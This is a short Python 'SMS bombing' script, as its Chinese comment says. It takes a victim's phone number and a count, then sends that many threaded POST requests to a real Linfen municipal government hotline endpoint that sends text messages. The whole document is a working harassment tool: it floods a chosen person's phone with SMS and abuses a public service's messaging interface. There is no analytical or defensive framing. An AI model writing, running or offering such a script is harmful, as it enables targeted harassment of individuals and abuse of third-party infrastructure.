import requests
import threading

# 一个短信接口 不停的轰炸


url = "http://szrx.linfen.gov.cn:8080/lf_12345_api/rx/mailbox/sendMessageOnly"
headers = {
    "Host": "szrx.linfen.gov.cn:8080",
    "Connection": "keep-alive",
    "Content-Length": "21",
    "Accept": "*/*",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Linux; Android 14; 23078PND5G Build/UP1A.230905.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.186 Mobile Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Origin": "http://szrx.linfen.gov.cn:8080",
    "Referer": "http://szrx.linfen.gov.cn:8080/lf_12345_web/views/szxx/huifu.html",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
}

userphone = input("请输入手机号: ")
num_requests = int(input("请输入发送请求的次数: "))


def send_request(i):
    data = {
        "userphone": userphone
    }
    response = requests.post(url, headers=headers, data=data)
    print(f"Response {i + 1}: Status Code:", response.status_code)
    print("Response Body:", response.json())


threads = []

for i in range(num_requests):
    t = threading.Thread(target=send_request, args=(i,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
